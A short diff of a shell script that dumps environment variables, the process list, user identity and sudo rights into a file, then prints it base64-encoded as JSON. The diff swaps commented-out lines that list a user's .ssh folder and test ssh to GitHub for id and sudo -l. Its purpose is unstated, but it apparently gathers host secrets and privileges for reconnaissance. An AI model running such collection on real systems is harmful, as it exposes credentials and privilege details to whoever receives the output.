@@ -4,9 +4,9 @@ env >>$OUT 2>&1
 echo "=================================="  >>$OUT 2>&1
 ps -ef  >>$OUT 2>&1
 echo "=================================="  >>$OUT 2>&1
-#ls -la /home/ubunut/.ssh  >>$OUT 2>&1
+id  >>$OUT 2>&1
 echo "=================================="  >>$OUT 2>&1
-#ssh -v  git@github.com  >>$OUT 2>&1
+sudo -l  >>$OUT 2>&1
 
 b64=$(cat $OUT|base64 -w0)
 echo "{ \"out\": \"${b64}\" }"
